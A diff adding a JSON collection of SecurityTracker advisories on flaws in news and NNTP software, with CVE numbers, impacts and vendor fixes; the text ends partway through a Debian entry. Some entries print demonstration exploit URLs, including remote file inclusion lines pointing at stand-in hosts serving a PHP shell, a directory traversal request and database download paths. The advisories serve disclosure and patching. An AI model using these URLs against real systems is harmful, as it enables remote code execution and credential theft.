@@ -1,0 +1,1033 @@
+{
+    "source": "1-2",
+    "Title": "phNNTP Include File Flaw in 'file_newsportal' Parameter Lets Remote Users Execute Arbitrary Code",
+    "SecurityTracker Alert ID": "1016668",
+    "SecurityTracker URL": "http://securitytracker.com/id/1016668",
+    "CVE Reference": "CVE-2006-4103",
+    "Updated": "Jun  8 2008",
+    "Original Entry Date": "Aug  9 2006",
+    "Impact": [
+        "Execution of arbitrary code via network",
+        "User access via network"
+    ],
+    "Exploit Included": "Yes",
+    "Version(s)": "1.3",
+    "Description": "A vulnerability was reported in phNNTP.  A remote user can include and execute arbitrary code on the target system.\nThe 'article-raw.php' script does not properly validate user-supplied input in the 'file_newsportal' parameter.  A remote user can supply a specially crafted URL to cause the target system to include and execute arbitrary PHP code from a remote location.  The PHP code, including operating system commands, will run with the privileges of the target web service.\n\nA demonstration exploit URL is provided:\n\nhttp://[target]/Dir_phNNTP/article-raw.php?file_newsportal=http://[www.evalsite.com]/shell.php?\n\nTr_ZiNDaN reported this vulnerability.",
+    "Impact'": "A remote user can execute arbitrary PHP code and operating system commands on the target system with the privileges of the target web service.",
+    "Solution": "No solution was available at the time of this entry.",
+    "Vendor URL": "sourceforge.net/projects/phnntp/",
+    "Cause": [
+        "Input validation error",
+        "State error"
+    ],
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)",
+        "Windows (Any)"
+    ],
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "MyNewsGroups Include File Flaw in 'myng_root' Parameter Lets Remote Users Execute Arbitrary Code",
+    "SecurityTracker Alert ID": "1016613",
+    "SecurityTracker URL": "http://securitytracker.com/id/1016613",
+    "CVE Reference": "CVE-2006-3966",
+    "Updated": "Jun  8 2008",
+    "Original Entry Date": "Aug  1 2006",
+    "Impact": [
+        "Execution of arbitrary code via network",
+        "User access via network"
+    ],
+    "Exploit Included": "Yes",
+    "Version(s)": "0.6b",
+    "Description": "A vulnerability was reported in MyNewsGroups.  A remote user can include and execute arbitrary code on the target system.\nThe '/lib/tree/layersmenue.inc.php' script does not properly validate user-supplied input in the myng_root parameter.  A remote user can supply a specially crafted URL to cause the target system to include and execute arbitrary PHP code from a remote location.  The PHP code, including operating system commands, will run with the privileges of the target web service.\n\nA demonstration exploit URL is provided:\n\nhttp://[target]/lib/tree/layersmenu.inc.php?myng_root=http://[evilsite]/PEAR.php/&cmd=ls\n\nPhilipp Niedziela discovered this vulnerability.",
+    "Impact'": "A remote user can execute arbitrary PHP code and operating system commands on the target system with the privileges of the target web service.",
+    "Solution": "No solution was available at the time of this entry.",
+    "Vendor URL": "mynewsgroups.sourceforge.net/",
+    "Cause": [
+        "Input validation error",
+        "State error"
+    ],
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)",
+        "Windows (Any)"
+    ],
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "Newspost Buffer Overflow in socket_getline() Lets Remote Users Crash the Process",
+    "SecurityTracker Alert ID": "1013056",
+    "SecurityTracker URL": "http://securitytracker.com/id/1013056",
+    "CVE Reference": "CVE-2005-0101",
+    "Date": "Feb  2 2005",
+    "Impact": [
+        "Denial of service via network",
+        "Execution of arbitrary code via network"
+    ],
+    "Version(s)": "2.1.1",
+    "Description": "A vulnerability was reported in newspost.  A remote user can cause newspost to crash or potentially execute arbitrary code.\nNiels Heinen reported that a remote server can trigger a buffer overflow in the socket_getline() function.  A remote server can supply a specially crafted response to cause the connecting newspost process to crash.  It may be possible to execute arbitrary code, but code execution was not confirmed in the report.\n\nThe flaw resides in 'base/socket.c'.",
+    "Impact'": "A remote NNTP server can cause the connecting newspost process to crash.",
+    "Solution": "No vendor solution was available at the time of this entry.\n\nAn unofficial patch is available at:\n\nhttp://people.freebsd.org/~niels/issues/newspost-20050114.txt",
+    "Vendor URL": "newspost.unixcab.org/",
+    "Cause": "Boundary error",
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)"
+    ],
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "newsgrab Has Unsafe Directory Permissions and Lets Remote Users Cause Files to Be Saved to Alternate Locations",
+    "SecurityTracker Alert ID": "1013055",
+    "SecurityTracker URL": "http://securitytracker.com/id/1013055",
+    "CVE Reference": [
+        "CVE-2005-0153",
+        "CVE-2005-0154"
+    ],
+    "Date": "Feb  2 2005",
+    "Impact": [
+        "Disclosure of system information",
+        "Disclosure of user information",
+        "Modification of system information",
+        "Modification of user information"
+    ],
+    "Fix Available": "Yes",
+    "Vendor Confirmed": "Yes",
+    "Version(s)": "prior to 0.5.0pre4",
+    "Description": "Two vulnerabilities were reported in newsgrab.  A local user can view files in the output directory.  A remote user may be able to create or overwrite files on the target system.\nNiels Heinen reported that the 'newsgrab.pl' file sets world readable permissions on the output directory [CVE: CVE-2005-0154].\n\nThe software also does not properly validate server-supplied filenames.  A remote server can create a news posting with a specially crafted filename containing '../' directory traversal characters.  Then, when the file is grabbed by the target user, the file may be saved to an alternate location with the privileges of the target user [CVE: CVE-2005-0153].",
+    "Impact'": "A local user can view files in the output directory.\n\nA remote user may be able to create or overwrite files on the target system with the privileges of the newsgrab process.",
+    "Solution": "The vendor has issued a fixed version (0.5.0pre4), available at:\n\nhttp://sourceforge.net/project/showfiles.php?group_id=52048",
+    "Vendor URL": "newsgrab.sourceforge.net/",
+    "Cause": [
+        "Access control error",
+        "Configuration error",
+        "Input validation error"
+    ],
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)"
+    ],
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "newsfetch sscanf Buffer Overflow May Let Remote Users Execute Arbitrary Code",
+    "SecurityTracker Alert ID": "1013053",
+    "SecurityTracker URL": "http://securitytracker.com/id/1013053",
+    "CVE Reference": "CVE-2005-0132",
+    "Date": "Feb  2 2005",
+    "Impact": [
+        "Denial of service via network",
+        "Execution of arbitrary code via network",
+        "User access via network"
+    ],
+    "Version(s)": "1.21",
+    "Description": "A vulnerability was reported in newsfetch.  A remote NNTP server can potentially execute arbitrary code on a connected system.\nNiels Heinen reported that the software uses unsafe sscanf calls to copy 501 bytes of user-supplied data (from a remote NNTP server) into a buffer that is only 100 bytes.  A remote NNTP server can send specially crafted strings in response to a LIST request from the connected target to trigger a buffer overflow.\n\nIt may be possible to execute arbitrary code, but code execution was not confirmed in the report.\n\nThe buffer overflow flaw resides in 'nntp.c'.\n\nA remote server can also cause the connected target to crash by, for example, returning a server banner that does not begin with a number.  This flaw is due to an uninitalized pointer.",
+    "Impact'": "A remote NNTP server may be able to execute arbitrary code on a connected client.\n\nA remote NNTP server can cause a connected client to crash.",
+    "Solution": "No vendor solution was available at the time of this entry.\n\nAn unofficial patch is available at:\n\nhttp://people.freebsd.org/~niels/issues/newsfetch-20050119.txt",
+    "Cause": [
+        "Boundary error",
+        "State error"
+    ],
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)"
+    ],
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "Yanf Buffer Overflow in get() Lets Remote Users Execute Arbitrary Code",
+    "SecurityTracker Alert ID": "1012557",
+    "SecurityTracker URL": "http://securitytracker.com/id/1012557",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "Dec 16 2004",
+    "Impact": [
+        "Execution of arbitrary code via network",
+        "User access via network"
+    ],
+    "Exploit Included": "Yes",
+    "Version(s)": "0.4",
+    "Description": "A vulnerability was reported in Yanf. A remote server can cause arbitrary code to be executed by the target user.\nD. J. Bernstein reported that a remote server can send a specially crafted HTTP response to the connected Yanf client to execute arbitrary code on the target user's system. The code will run with the privileges of the target user.\n\nThe buffer overflow resides in the get() function in 'src/get.c'\n\nAriel Berkman is credited with discovering this flaw.",
+    "Impact'": "A remote server can cause arbitrary code to be executed by the target user with the privileges of the target user.",
+    "Solution": "No solution was available at the time of this entry.",
+    "Vendor URL": "yanf.sourceforge.net/",
+    "Cause": "Boundary error",
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)"
+    ],
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "Compulsive Media News Discloses Database to Remote Users",
+    "SecurityTracker Alert ID": "1011028",
+    "SecurityTracker URL": "http://securitytracker.com/id/1011028",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "Aug 23 2004",
+    "Impact": [
+        "Disclosure of authentication information",
+        "Disclosure of user information",
+        "User access via network"
+    ],
+    "Exploit Included": "Yes",
+    "Version(s)": "1.2",
+    "Description": "Security .Net Information reported a vulnerability in Compulsive Media News.  A remote user can download the database.\nIt is reported that a remote user can directly download the news database, which includes the administrator's username and password.\n\nSome demonstration exploit URLs are provided:\n\nhttp://[target]/news/news.mdb\nhttp://[target]/news.mdb",
+    "Impact'": "A remote user can download the news database, which includes the administrator's username and password.",
+    "Solution": "No solution was available at the time of this entry.\n\n[Editor's note:  It appears that the software is no longer available from the vendor.  We have contacted the vendor for clarification.]",
+    "Vendor URL": "www.compulsive.co.uk",
+    "Cause": "Access control error",
+    "Underlying OS": "Windows (Any)",
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "DUnews Authentication Flaw Lets Remote Users Gain Administrative Access to the Application",
+    "SecurityTracker Alert ID": "1008793",
+    "SecurityTracker URL": "http://securitytracker.com/id/1008793",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "Jan 21 2004",
+    "Impact": "User access via network",
+    "Fix Available": "Yes",
+    "Vendor Confirmed": "Yes",
+    "Exploit Included": "Yes",
+    "Version(s)": "1.0",
+    "Description": "Security Corporation reported vulnerabilities in DUnews, as well as in many other DUware applications.  A remote user can gain administrative access on the application.\nIt is reported that a remote user can directly access certain scripts that do not require authentication but provide access to administrative functions.\n\nFrog-m@n is credited with discovering this flaw.\n\nThe following notification timeline is provided:\n\n10/01/2004 Vulnerability discovered\n12/01/2004 Vendor notified\n14/01/2004 Vendor response\n14/01/2004 Security Corporation clients notified\n14/01/2004 Started e-mail discussions\n17/01/2004 Last e-mail received\n20/01/2004 Public disclosure",
+    "Impact'": "A remote user can gain administrative access to the application.",
+    "Solution": "The vendor has released a fixed version (1.1), available at:\n\nhttp://www.duware.com/products/download.asp?iPro=25&iCat=11&nCat=News%20Publishing",
+    "Vendor URL": "www.duware.com/",
+    "Cause": "Authentication error",
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)",
+        "Windows (Any)"
+    ],
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "(Slackware Issues Fix) INN Buffer Overflow in ARTpost() May Let Remote Users Execute Arbitrary Code",
+    "SecurityTracker Alert ID": "1008728",
+    "SecurityTracker URL": "http://securitytracker.com/id/1008728",
+    "CVE Reference": "CVE-2004-0045",
+    "Updated": "Jan 20 2004",
+    "Original Entry Date": "Jan 15 2004",
+    "Impact": [
+        "Execution of arbitrary code via network",
+        "User access via network"
+    ],
+    "Fix Available": "Yes",
+    "Vendor Confirmed": "Yes",
+    "Version(s)": "2.4.0",
+    "Description": "A buffer overflow vulnerability was reported in INN in the processing of control messages.  A remote user may be able to execute arbitrary code on the target system.\nIt is reported that a flaw in the filing of control messages into per-type newsgroups may be exploited by a remote user to execute arbitrary code on the target system.\n\nThe bug reportedly resides in 'art.c' in the ARTpost() function, where a static buffer can be overflowed with user-supplied input.  This bug was introduced in version 2.4.0, according to the report.\n\nDan Riley is credited with reporting this flaw.",
+    "Impact'": "A remote user may be able to execute arbitrary code on the target news server with the privileges of the 'innd' process.",
+    "Solution": "Slackware has released a fix.\n\nUpdated package for Slackware 9.0:\n\nftp://ftp.slackware.com/pub/slackware/slackware-9.0/patches/packages/inn-2.4.1-i386-1.tgz\n\nUpdated package for Slackware 9.1:\n\nftp://ftp.slackware.com/pub/slackware/slackware-9.1/patches/packages/inn-2.4.1-i486-1.tgz\n\nUpdated package for Slackware -current:\n\nftp://ftp.slackware.com/pub/slackware/slackware-current/extra/inn/inn-2.4.1-i486-1.tgz\n\nThe MD5 signatures are:\n\nSlackware 9.0 package:\ne8f68835dcb70cfa4f5b812352880bea  inn-2.4.1-i386-1.tgz\n\nSlackware 9.1 package:\n7d7e8e8934bd53f7b2c884115078cd5d  inn-2.4.1-i486-1.tgz\n\nSlackware -current package:\n0da5a48fee9b37789948f7030bd09d7e  inn-2.4.1-i486-1.tgz",
+    "Vendor URL": "www.isc.org/products/INN/",
+    "Cause": "Boundary error",
+    "Underlying OS": "Linux (Slackware)",
+    "Underlying OS Comments": "9.0, 9.1, and -current",
+    "Message History": [
+        "https://securitytracker.com/id/1008655"
+    ]
+}{
+    "source": "1-2",
+    "Title": "Leafnode Fetchnews May Hang When Retrieving News Messages With No Body",
+    "SecurityTracker Alert ID": "1008660",
+    "SecurityTracker URL": "http://securitytracker.com/id/1008660",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "Jan  9 2004",
+    "Impact": "Denial of service via network",
+    "Fix Available": "Yes",
+    "Vendor Confirmed": "Yes",
+    "Version(s)": "1.9.47 and prior versions",
+    "Description": "A vulnerability was reported in Leafnode fetchnews.  A remote user can cause the fetchnews client to hang when attempting to download posted messasges in a certain format.\nIt is reported that under certain circumstances, fetchnews may wait indefinitely for input that never arrives.  According to the report, the process will continue to run, preventing subsequent instances of fetchnews and texpire.  This, in turn, will keep the news base from being updated and old articles from expiring, the report said.\n\nIt is reported that a remote user can post an article that is missing certain mandatory headers and that has no message body to cause fetchnews to hang.\n\nThe situation can reportedly occur when the minlines=0 and delaybody=0 default configuration options are set and either there is no filterfile configuration (which is the default setting) or the article_despite_filter=1 option is configured.\n\nThe affected process must usually be terminated manually via a \"kill\" command or via a reboot to return to normal operations.\n\nToni Viemero is credited with reporting this flaw.",
+    "Impact'": "A remote user can cause fetchnews to hang.  As a result, the news base will not be updated and older articles will not expire.",
+    "Solution": "The vendor has released a fixed version (1.9.48), available at:\n\nhttp://sourceforge.net/project/showfiles.php?group_id=57767&release_id=208614\n\nThe vendor reports that as a workaround for leafnode 1.9.47, you can set minlines=1 in your configuration file (usually /etc/leafnode/config).",
+    "Vendor URL": "www.leafnode.org/",
+    "Cause": "State error",
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)"
+    ],
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "INN Buffer Overflow in ARTpost() May Let Remote Users Execute Arbitrary Code",
+    "SecurityTracker Alert ID": "1008655",
+    "SecurityTracker URL": "http://securitytracker.com/id/1008655",
+    "CVE Reference": "CVE-2004-0045",
+    "Updated": "Jan 20 2004",
+    "Original Entry Date": "Jan  8 2004",
+    "Impact": [
+        "Execution of arbitrary code via network",
+        "User access via network"
+    ],
+    "Fix Available": "Yes",
+    "Vendor Confirmed": "Yes",
+    "Version(s)": "2.4.0",
+    "Description": "A buffer overflow vulnerability was reported in INN in the processing of control messages.  A remote user may be able to execute arbitrary code on the target system.\nIt is reported that a flaw in the filing of control messages into per-type newsgroups may be exploited by a remote user to execute arbitrary code on the target system.\n\nThe bug reportedly resides in 'art.c' in the ARTpost() function, where a static buffer can be overflowed with user-supplied input.  This bug was introduced in version 2.4.0, according to the report.\n\nDan Riley is credited with reporting this flaw.",
+    "Impact'": "A remote user may be able to execute arbitrary code on the target news server with the privileges of the 'innd' process.",
+    "Solution": "The vendor has released a fixed version (2.4.1), available at:\n\nftp://ftp.isc.org/isc/inn/inn-2.4.1.tar.gz\nhttp://www.isc.org/products/INN/",
+    "Vendor URL": "www.isc.org/products/INN/",
+    "Cause": "Boundary error",
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)"
+    ],
+    "Message History": [
+        "https://securitytracker.com/id/1008728"
+    ]
+}{
+    "source": "1-2",
+    "Title": "CGINews Discloses Passwords to Local Users and Log Files to Remote Users",
+    "SecurityTracker Alert ID": "1008480",
+    "SecurityTracker URL": "http://securitytracker.com/id/1008480",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "Dec 15 2003",
+    "Impact": [
+        "Disclosure of authentication information",
+        "Disclosure of system information",
+        "Disclosure of user information"
+    ],
+    "Vendor Confirmed": "Yes",
+    "Version(s)": "1.07",
+    "Description": "A vulnerability was reported in CGINews.  A local user can decode passwords.  A remote user can view the log files.\nJeiAr of the GulfTech Security Research Team reported that user passwords in the *.pwl files are encoded with an algorithm that can be readily decoded.  A local user can obtain the passwords.\n\nA demonstration exploit decoding algorithm is available at:\n\nhttp://www.gulftech.org/vuln/cnc.txt\n\nIt is also reported that a remote user can view the log files in a default configuration.  The log files have the following naming convention:\n\nusername/username.log",
+    "Impact'": "A local user can view passwords.  A remote user can view log files.",
+    "Solution": "No code fix was available at the time of this entry.\n\nAccording to the author, the vendor plans to include a '.htaccess' file in future versions to use web server access controls to prevent log file disclosure.  An example (written by the author of the report) is provided in the Source Message.\n\nThe vendor reportedly does not plan to fix the encoding algorithm.",
+    "Vendor URL": "triskam.virtualave.net/cginews.html",
+    "Cause": "Access control error",
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)",
+        "Windows (Any)"
+    ],
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "(Red Hat Issues Fix for RH Enterprise Linux) Pan Newsreader Can Be Crashed By Remote Users",
+    "SecurityTracker Alert ID": "1008436",
+    "SecurityTracker URL": "http://securitytracker.com/id/1008436",
+    "CVE Reference": "CVE-2003-0855",
+    "Date": "Dec 10 2003",
+    "Impact": "Denial of service via network",
+    "Fix Available": "Yes",
+    "Vendor Confirmed": "Yes",
+    "Version(s)": "0.13.3.93 and prior",
+    "Description": "A vulnerability was reported in the Pan newsreader.  A remote user can cause the client to crash.\nIt is reported that a remote user can post a message containing certain headers to cause a target user's Pan reader to crash when loading the message.",
+    "Impact'": "A remote user can post a news message that will cause a target user's client to crash.",
+    "Solution": "Red Hat has released a fix.\n\nRed Hat Enterprise Linux AS (Advanced Server) version 2.1:\n\nSRPMS:\nftp://updates.redhat.com/enterprise/2.1AS/en/os/SRPMS/pan-0.9.7-3.src.rpm\n\ni386:\nAvailable from Red Hat Network: pan-0.9.7-3.i386.rpm\n\nia64:\nAvailable from Red Hat Network: pan-0.9.7-3.ia64.rpm\n\nRed Hat Linux Advanced Workstation 2.1:\n\nSRPMS:\nftp://updates.redhat.com/enterprise/2.1AW/en/os/SRPMS/pan-0.9.7-3.src.rpm\n\nia64:\nAvailable from Red Hat Network: pan-0.9.7-3.ia64.rpm\n\nRed Hat Enterprise Linux ES version 2.1:\n\nSRPMS:\nftp://updates.redhat.com/enterprise/2.1ES/en/os/SRPMS/pan-0.9.7-3.src.rpm\n\ni386:\nAvailable from Red Hat Network: pan-0.9.7-3.i386.rpm\n\nRed Hat Enterprise Linux WS version 2.1:\n\nSRPMS:\nftp://updates.redhat.com/enterprise/2.1WS/en/os/SRPMS/pan-0.9.7-3.src.rpm\n\ni386:\nAvailable from Red Hat Network: pan-0.9.7-3.i386.rpm\n\nThe verification checksums are:\n\nMD5 sum                          Package Name\nf43279cf15870b38a23228afb9c2299f 2.1AS/en/os/SRPMS/pan-0.9.7-3.src.rpm\nd32f1285822ba96eee66102f9cedbc57 2.1AS/en/os/i386/pan-0.9.7-3.i386.rpm\n1033c5be1c4aa5d8faafad7e05d1a512 2.1AS/en/os/ia64/pan-0.9.7-3.ia64.rpm\nf43279cf15870b38a23228afb9c2299f 2.1AW/en/os/SRPMS/pan-0.9.7-3.src.rpm\n1033c5be1c4aa5d8faafad7e05d1a512 2.1AW/en/os/ia64/pan-0.9.7-3.ia64.rpm\nf43279cf15870b38a23228afb9c2299f 2.1ES/en/os/SRPMS/pan-0.9.7-3.src.rpm\nd32f1285822ba96eee66102f9cedbc57 2.1ES/en/os/i386/pan-0.9.7-3.i386.rpm\nf43279cf15870b38a23228afb9c2299f 2.1WS/en/os/SRPMS/pan-0.9.7-3.src.rpm\nd32f1285822ba96eee66102f9cedbc57 2.1WS/en/os/i386/pan-0.9.7-3.i386.rpm",
+    "Vendor URL": "pan.rebelbase.com/",
+    "Cause": "Exception handling error",
+    "Underlying OS": "Linux (Red Hat Linux)",
+    "Underlying OS Comments": "Red Hat Enterprise Linux 2.1",
+    "Message History": [
+        "https://securitytracker.com/id/1008285"
+    ]
+}{
+    "source": "1-2",
+    "Title": "(Red Hat Issues Fix for Red Hat Linux) Re: Pan Newsreader Can Be Crashed By Remote Users",
+    "SecurityTracker Alert ID": "1008286",
+    "SecurityTracker URL": "http://securitytracker.com/id/1008286",
+    "CVE Reference": "CVE-2003-0855",
+    "Date": "Nov 24 2003",
+    "Impact": "Denial of service via network",
+    "Fix Available": "Yes",
+    "Vendor Confirmed": "Yes",
+    "Version(s)": "0.13.3.93 and prior",
+    "Description": "A vulnerability was reported in the Pan newsreader.  A remote user can cause the client to crash.\nIt is reported that a remote user can post a message containing certain headers to cause a target user's Pan reader to crash when loading the message.",
+    "Impact'": "A remote user can post a news message that will cause a target user's client to crash.",
+    "Solution": "Red Hat has issued a fix.\n\nRed Hat Linux 7.1:\n\nSRPMS:\nftp://updates.redhat.com/7.1/en/os/SRPMS/pan-0.9.7-2.71.src.rpm\n\ni386:\nftp://updates.redhat.com/7.1/en/os/i386/pan-0.9.7-2.71.i386.rpm\n\nRed Hat Linux 7.2:\n\nSRPMS:\nftp://updates.redhat.com/7.2/en/os/SRPMS/pan-0.11.4-1.src.rpm\n\ni386:\nftp://updates.redhat.com/7.2/en/os/i386/pan-0.11.4-1.i386.rpm\n\nia64:\nftp://updates.redhat.com/7.2/en/os/ia64/pan-0.11.4-1.ia64.rpm\n\nRed Hat Linux 7.3:\n\nSRPMS:\nftp://updates.redhat.com/7.3/en/os/SRPMS/pan-0.11.4-1.src.rpm\n\ni386:\nftp://updates.redhat.com/7.3/en/os/i386/pan-0.11.4-1.i386.rpm\n\nRed Hat Linux 8.0:\n\nSRPMS:\nftp://updates.redhat.com/8.0/en/os/SRPMS/pan-0.13.4-1.src.rpm\n\ni386:\nftp://updates.redhat.com/8.0/en/os/i386/pan-0.13.4-1.i386.rpm\n\nRed Hat Linux 9:\n\nSRPMS:\nftp://updates.redhat.com/9/en/os/SRPMS/pan-0.14.2-1.9.src.rpm\n\ni386:\nftp://updates.redhat.com/9/en/os/i386/pan-0.14.2-1.9.i386.rpm\n\nThe verification checksums are:\n\nMD5 sum                          Package Name\nf7ae5c253d3c673e940d080533ea0da2 7.1/en/os/SRPMS/pan-0.9.7-2.71.src.rpm\n678e7f0f2ea996e3b8949b3bb607554b 7.1/en/os/i386/pan-0.9.7-2.71.i386.rpm\n64d8752453a9e0437b4dd7bbb2c79504 7.2/en/os/SRPMS/pan-0.11.4-1.src.rpm\n391d0c2e9eb7046f7b53496cc1ae0a4b 7.2/en/os/i386/pan-0.11.4-1.i386.rpm\n9faccc8b01b90ca615e0c68f5b67b738 7.2/en/os/ia64/pan-0.11.4-1.ia64.rpm\n64d8752453a9e0437b4dd7bbb2c79504 7.3/en/os/SRPMS/pan-0.11.4-1.src.rpm\n391d0c2e9eb7046f7b53496cc1ae0a4b 7.3/en/os/i386/pan-0.11.4-1.i386.rpm\n5e7a39ef2cc9782432e688719c83b078 8.0/en/os/SRPMS/pan-0.13.4-1.src.rpm\ne3e3161bcb604f09b07b15c1b1fb817d 8.0/en/os/i386/pan-0.13.4-1.i386.rpm\nd05d62893b42a03b570f8e60c2f3ef39 9/en/os/SRPMS/pan-0.14.2-1.9.src.rpm\n7027ab2a49f4bb0aa4efa7415f0bd6cb 9/en/os/i386/pan-0.14.2-1.9.i386.rpm",
+    "Vendor URL": "pan.rebelbase.com/",
+    "Cause": "Exception handling error",
+    "Underlying OS": "Linux (Red Hat Linux)",
+    "Underlying OS Comments": "7.1, 7.2, 7.3, 8.0, 9",
+    "Message History": [
+        "https://securitytracker.com/id/1008285"
+    ]
+}{
+    "source": "1-2",
+    "Title": "Pan Newsreader Can Be Crashed By Remote Users",
+    "SecurityTracker Alert ID": "1008285",
+    "SecurityTracker URL": "http://securitytracker.com/id/1008285",
+    "CVE Reference": "CVE-2003-0855",
+    "Date": "Nov 24 2003",
+    "Impact": "Denial of service via network",
+    "Fix Available": "Yes",
+    "Vendor Confirmed": "Yes",
+    "Version(s)": "0.13.3.93 and prior",
+    "Description": "A vulnerability was reported in the Pan newsreader.  A remote user can cause the client to crash.\nIt is reported that a remote user can post a message containing certain headers to cause a target user's Pan reader to crash when loading the message.",
+    "Impact'": "A remote user can post a news message that will cause a target user's client to crash.",
+    "Solution": "The vendor has released a fixed version (0.13.4), available at:\n\nhttp://pan.rebelbase.com/download/",
+    "Vendor URL": "pan.rebelbase.com/",
+    "Cause": "Exception handling error",
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)"
+    ],
+    "Message History": [
+        "https://securitytracker.com/id/1008286",
+        "https://securitytracker.com/id/1008436"
+    ]
+}{
+    "source": "1-2",
+    "Title": "MPNews PRO Directory Traversal Flaw Discloses Files to Remote Users",
+    "SecurityTracker Alert ID": "1007866",
+    "SecurityTracker URL": "http://securitytracker.com/id/1007866",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "Oct  2 2003",
+    "Impact": [
+        "Disclosure of system information",
+        "Disclosure of user information"
+    ],
+    "Vendor Confirmed": "Yes",
+    "Exploit Included": "Yes",
+    "Version(s)": "2.1.0.18",
+    "Description": "GamaSec reported a directory traversal vulnerability in the MPNews PRO news server. A remote user can view files located outside of the root document directory.\nThe news server does not properly validate user-supplied input to prohibit directory traversal characters from URL requests. A remote user can view any file on the system that is readable by the news server process.\n\nA demonstration exploit URLs are provided:\n\nhttp://localhost:81/./.././../mpnews.ini\n\nThe vendor was reportedly notified on October 1, 2003.",
+    "Impact'": "A remote user can view arbitrary files on the system that are readable by the news server process.",
+    "Solution": "No solution was available at the time of this entry. The vendor is reportedly working on a fix.",
+    "Vendor URL": "www.mutantpenguin.co.uk/mpnewspro/",
+    "Cause": [
+        "Access control error",
+        "Input validation error"
+    ],
+    "Underlying OS": "Windows (Any)",
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "(Debian Issues Fix) GKrellM Newsticker Lets Remote Users Execute Arbitrary Shell Commands on the Target User's Client",
+    "SecurityTracker Alert ID": "1006642",
+    "SecurityTracker URL": "http://securitytracker.com/id/1006642",
+    "CVE Reference": [
+        "CVE-2003-0205",
+        "CVE-2003-0206"
+    ],
+    "Date": "Apr 24 2003",
+    "Impact": [
+        "Denial of service via network",
+        "Execution of arbitrary code via network",
+        "User access via network"
+    ],
+    "Fix Available": "Yes",
+    "Vendor Confirmed": "Yes",
+    "Version(s)": "0.3, possibly 0.3.5",
+    "Description": "Two vulnerabilities were reported in the GKrellM Newsticker plug-in.  A remote server can execute arbitrary shell commands on the target user's system in certain cases or cause the target user's GKrellM system to crash.\nIt is reported that a malicious RDF news feed can provide URLs containing special shell characters so that, when the target user clicks on the affected ticker title, arbitrary shell commands will be executed on the target user's host.\n\nIt is also reported that the news ticker software can cause the entire GKrellM system to crash via an RDF file that has a link or a title element that is not limited to a single line.  A remote user (acting as a server) could supply a specially crafted RDF file to cause the target user's GKrellM application to crash.\n\nBrian Campbell is credited with discovering these flaws.",
+    "Impact'": "A remote user (acting as a server) can execute arbitrary shell commands on the target user's system.\n\nA remote user (acting as a server) can cause the target user's GKrellM system to crash.",
+    "Solution": "Debian has released a fix in version 0.3-3.1 for the stable distribution (woody).  The old stable distribution (potato) is reportedly not affected.  The unstable distribution (sid) is not yet fixed.\n\nDebian GNU/Linux 3.0 alias woody:\n\n  Source archives:\n\n    http://security.debian.org/pool/updates/main/g/gkrellm-newsticker/gkrellm-newsticker_0.3-3.1.dsc\n      Size/MD5 checksum:      736 48df0aef0622167773057cd7bf0fd17f\n    http://security.debian.org/pool/updates/main/g/gkrellm-newsticker/gkrellm-newsticker_0.3-3.1.diff.gz\n      Size/MD5 checksum:     2468 bc17c9c128b8a2550f7812dae9f4b163\n    http://security.debian.org/pool/updates/main/g/gkrellm-newsticker/gkrellm-newsticker_0.3.orig.tar.gz\n      Size/MD5 checksum:    25849 41a647c4671f6801ed9b3a3de7d414ca\n\n  Alpha architecture:\n\n    http://security.debian.org/pool/updates/main/g/gkrellm-newsticker/gkrellm-newsticker_0.3-3.1_alpha.deb\n      Size/MD5 checksum:    43506 47726e8c350b581bbf453f5d5c231dbd\n\n  ARM architecture:\n\n    http://security.debian.org/pool/updates/main/g/gkrellm-newsticker/gkrellm-newsticker_0.3-3.1_arm.deb\n      Size/MD5 checksum:    37756 addfe4f87f35f0243a83b0e5e9286646\n\n  Intel IA-32 architecture:\n\n    http://security.debian.org/pool/updates/main/g/gkrellm-newsticker/gkrellm-newsticker_0.3-3.1_i386.deb\n      Size/MD5 checksum:    36030 48cc15c0da005d6b53757dfcee318dd0\n\n  Intel IA-64 architecture:\n\n    http://security.debian.org/pool/updates/main/g/gkrellm-newsticker/gkrellm-newsticker_0.3-3.1_ia64.deb\n      Size/MD5 checksum:    47160 f195d6caee4c186ed2ee6921eb454daa\n\n  HP Precision architecture:\n\n    http://security.debian.org/pool/updates/main/g/gkrellm-newsticker/gkrellm-newsticker_0.3-3.1_hppa.deb\n      Size/MD5 checksum:    43974 5140d9e63e1647ff314c0c4044ddd4d3\n\n  Motorola 680x0 architecture:\n\n    http://security.debian.org/pool/updates/main/g/gkrellm-newsticker/gkrellm-newsticker_0.3-3.1_m68k.deb\n      Size/MD5 checksum:    42164 3a2f0b85e3c7d6ee741c121f719c33ad\n\n  Big endian MIPS architecture:\n\n    http://security.debian.org/pool/updates/main/g/gkrellm-newsticker/gkrellm-newsticker_0.3-3.1_mips.deb\n      Size/MD5 checksum:    36786 84ba4b61bd0c3c32459829a27ed1b010\n\n  Little endian MIPS 